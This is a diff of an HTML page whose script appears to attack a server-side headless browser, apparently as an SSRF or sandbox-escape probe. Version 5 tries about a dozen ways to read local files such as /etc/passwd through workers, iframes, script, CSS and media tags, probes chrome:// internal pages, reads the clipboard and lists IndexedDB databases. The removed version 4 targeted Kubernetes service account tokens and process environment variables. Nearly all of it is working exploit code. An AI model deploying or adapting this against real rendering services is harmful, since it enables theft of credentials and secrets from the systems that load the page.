@@ -1,115 +1,163 @@
 <html><body>
-<h2>SSRF Probe v4 - Worker File Read</h2>
+<h2>SSRF Probe v5 - Sandbox Escape</h2>
 <pre id="r"></pre>
 <script>
 var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
 
-L('UA: '+navigator.userAgent);
-L('Cores: '+navigator.hardwareConcurrency+' Mem: '+(navigator.deviceMemory||'?')+'GB');
-L('Webdriver: '+navigator.webdriver);
-L('Location: '+location.href);
+L('Origin: '+location.origin);
+L('Proto: '+location.protocol);
 
-// Web Worker file read (bug #330 technique)
-L('\n== Worker File Read ==');
-
-var workerCode = '\
-self.onmessage = function(e) {\
-  var results = [];\
-  for (var i = 0; i < e.data.length; i++) {\
-    try {\
-      var xhr = new XMLHttpRequest();\
-      xhr.open("GET", e.data[i], false);\
-      xhr.send();\
-      results.push({file: e.data[i], status: xhr.status, len: xhr.responseText.length, body: xhr.responseText.substring(0, 2000)});\
-    } catch(err) {\
-      results.push({file: e.data[i], error: err.message});\
-    }\
+// 1. Worker importScripts - different from XHR, might bypass
+L('\n== Worker importScripts ==');
+var w1code = '\
+var files=["file:///etc/passwd","file:///etc/hostname","file:///proc/self/cgroup"];\
+var results=[];\
+for(var i=0;i<files.length;i++){\
+  try{\
+    importScripts(files[i]);\
+    results.push({f:files[i],s:"IMPORTED"});\
+  }catch(e){\
+    results.push({f:files[i],e:e.constructor.name+": "+e.message});\
   }\
-  self.postMessage(results);\
-};';
+}\
+self.postMessage(results);';
 
-var workerDone = false;
-try {
-  var blob = new Blob([workerCode], {type: 'text/javascript'});
-  var worker = new Worker(URL.createObjectURL(blob));
-  L('Worker created OK');
+var w1done=false;
+try{
+  var b1=new Blob([w1code],{type:'text/javascript'});
+  var w1=new Worker(URL.createObjectURL(b1));
+  w1.onmessage=function(e){w1done=true;e.data.forEach(function(r){L(r.f+': '+(r.s||r.e));});};
+  w1.onerror=function(e){w1done=true;L('W1 err: '+e.message);};
+  L('Worker importScripts started');
+}catch(e){w1done=true;L('W1 create: '+e.message);}
 
-  worker.onmessage = function(e) {
-    workerDone = true;
-    var results = e.data;
-    L('Worker returned ' + results.length + ' results');
-    for (var i = 0; i < results.length; i++) {
-      var r = results[i];
-      if (r.error) {
-        L('[FAIL] ' + r.file + ': ' + r.error);
-      } else {
-        L('[READ] ' + r.file + ' status=' + r.status + ' len=' + r.len);
-        L(r.body);
-      }
-    }
-  };
+// 2. Worker with data: URI scheme
+L('\n== Worker data: URI ==');
+var w2code='self.postMessage("data-worker-alive");try{var x=new XMLHttpRequest();x.open("GET","file:///etc/passwd",false);x.send();self.postMessage("FILE:"+x.responseText.substring(0,500));}catch(e){self.postMessage("ERR:"+e.message);}';
+var w2done=false;
+try{
+  var w2=new Worker('data:text/javascript,'+encodeURIComponent(w2code));
+  w2.onmessage=function(e){w2done=true;L('data-Worker: '+e.data);};
+  w2.onerror=function(e){w2done=true;L('data-Worker err: '+e.message);};
+  L('data: Worker started');
+}catch(e){w2done=true;L('data: Worker create: '+e.message);}
 
-  worker.onerror = function(e) {
-    workerDone = true;
-    L('Worker ERROR: ' + e.message + ' at ' + e.filename + ':' + e.lineno);
-  };
-
-  worker.postMessage([
-    'file:///etc/passwd',
-    'file:///etc/hostname',
-    'file:///etc/resolv.conf',
-    'file:///var/run/secrets/kubernetes.io/serviceaccount/token',
-    'file:///var/run/secrets/kubernetes.io/serviceaccount/namespace',
-    'file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
-    'file:///proc/self/cgroup',
-    'file:///proc/self/environ',
-    'file:///proc/net/tcp',
-    'file:///etc/os-release'
-  ]);
-  L('Messages sent to worker, waiting...');
-} catch(e) {
-  L('Worker create FAILED: ' + e.message);
-  workerDone = true;
+// 3. Try various Chrome internal protocols
+L('\n== Protocol Probes ==');
+var protocols=['chrome://version','chrome://settings','chrome://flags',
+  'chrome://gpu','chrome://net-internals','chrome://inspect',
+  'devtools://devtools/bundled/inspector.html',
+  'view-source:file:///etc/passwd',
+  'chrome-extension://invalid/manifest.json'];
+for(var i=0;i<protocols.length;i++){
+  var p=protocols[i];
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET',p,false);
+    x.send();
+    L(p+': s='+x.status+' len='+x.responseText.length);
+  }catch(e){L(p+': '+e.message);}
 }
 
-// Also try direct main-thread file read (expected to fail but test it)
-L('\n== Main Thread file:// ==');
-try {
-  var x = new XMLHttpRequest();
-  x.open('GET', 'file:///etc/passwd', false);
-  x.send();
-  L('Main XHR: status=' + x.status + ' len=' + x.responseText.length);
-  L(x.responseText.substring(0, 500));
-} catch(e) {
-  L('Main XHR: ' + e.message);
-}
+// 4. iframe file:// (read via contentDocument)
+L('\n== iframe file:// ==');
+var ifr=document.createElement('iframe');
+ifr.style.display='none';
+ifr.src='file:///etc/passwd';
+document.body.appendChild(ifr);
+ifr.onload=function(){
+  try{L('iframe loaded, doc: '+ifr.contentDocument?.body?.textContent?.substring(0,200));}
+  catch(e){L('iframe cross-origin: '+e.message);}
+};
+ifr.onerror=function(){L('iframe error');};
 
-// Also try fetch file://
-try {
-  // Can't do sync fetch, so just fire and forget
-  fetch('file:///etc/passwd').then(function(r){
-    return r.text();
-  }).then(function(t){
-    L('Main fetch file: len=' + t.length);
-    L(t.substring(0, 500));
-  }).catch(function(e){
-    L('Main fetch file: ' + e.message);
-  });
-} catch(e) {
-  L('Main fetch file catch: ' + e.message);
-}
+// 5. object/embed with file://
+L('\n== object/embed ==');
+var obj=document.createElement('object');
+obj.data='file:///etc/passwd';
+obj.type='text/plain';
+document.body.appendChild(obj);
 
-// Busy wait to keep page alive for Worker to finish
-L('\nBusy-waiting 12s for worker...');
-var start = Date.now();
-while (Date.now() - start < 12000) {
-  // Yield briefly every 100ms to let Worker messages process
-  if ((Date.now() - start) % 1000 < 10 && !workerDone) {
-    // Can't yield in busy wait, but Worker msg queue will process after
+// 6. script src=file:// - might leak via error handler
+L('\n== script src=file:// ==');
+window.onerror=function(msg,url,line,col,err){
+  L('GlobalError: msg='+msg+' url='+url+' line='+line);
+  return true;
+};
+var scr=document.createElement('script');
+scr.src='file:///etc/hostname';
+scr.onerror=function(e){L('script file err: '+e.type);};
+scr.onload=function(){L('script file LOADED');};
+document.head.appendChild(scr);
+
+// 7. CSS @import / @font-face with file://
+L('\n== CSS file:// ==');
+var style=document.createElement('style');
+style.textContent='@import url("file:///etc/passwd"); @font-face{font-family:test;src:url("file:///etc/passwd");}';
+document.head.appendChild(style);
+try{
+  var sheets=document.styleSheets;
+  for(var i=0;i<sheets.length;i++){
+    try{var rules=sheets[i].cssRules;L('Sheet '+i+': '+rules.length+' rules');}
+    catch(e){L('Sheet '+i+': '+e.message);}
   }
-}
-L('Wait done. workerDone=' + workerDone);
-L('\n== DONE v4 ==');
+}catch(e){L('CSS: '+e.message);}
+
+// 8. link tag with file://
+var link=document.createElement('link');
+link.rel='stylesheet';
+link.href='file:///etc/passwd';
+link.onerror=function(){L('link file err');};
+link.onload=function(){L('link file LOADED');};
+document.head.appendChild(link);
+
+// 9. img with file:// (for binary files)
+var img=new Image();
+img.src='file:///etc/passwd';
+img.onload=function(){L('img file LOADED '+img.width+'x'+img.height);};
+img.onerror=function(){L('img file err');};
+
+// 10. audio/video with file://
+var aud=document.createElement('audio');
+aud.src='file:///etc/passwd';
+aud.onerror=function(){L('audio file err');};
+aud.onloadeddata=function(){L('audio file LOADED');};
+
+// 11. navigator.clipboard (might have pre-existing data)
+L('\n== Clipboard ==');
+try{
+  navigator.clipboard.readText().then(function(t){L('Clipboard: '+t.substring(0,200));}).catch(function(e){L('Clipboard: '+e.message);});
+}catch(e){L('Clipboard: '+e.message);}
+
+// 12. Try to access indexedDB databases
+L('\n== IndexedDB ==');
+try{
+  indexedDB.databases().then(function(dbs){L('IDB: '+dbs.length+' databases');dbs.forEach(function(d){L('  '+d.name+' v'+d.version);});}).catch(function(e){L('IDB: '+e.message);});
+}catch(e){L('IDB: '+e.message);}
+
+// 13. SharedArrayBuffer (Spectre prerequisite)
+L('\n== SharedArrayBuffer ==');
+try{var sab=new SharedArrayBuffer(1024);L('SAB: available ('+sab.byteLength+'B)');}catch(e){L('SAB: '+e.message);}
+
+// 14. Performance observer for resource timing
+L('\n== ResourceTiming ==');
+try{
+  var entries=performance.getEntriesByType('resource');
+  L('Resources: '+entries.length);
+  entries.forEach(function(e){L('  '+e.name.substring(0,80)+' '+e.duration.toFixed(1)+'ms');});
+}catch(e){}
+
+// Busy wait
+L('\nWaiting 10s...');
+var start=Date.now();
+while(Date.now()-start<10000){}
+L('Wait done. w1='+w1done+' w2='+w2done);
+
+// Check iframe after wait
+try{L('iframe doc: '+(ifr.contentDocument?.body?.textContent?.substring(0,200)||'null'));}
+catch(e){L('iframe post-wait: '+e.message);}
+
+L('\n== DONE v5 ==');
 </script>
 </body></html>
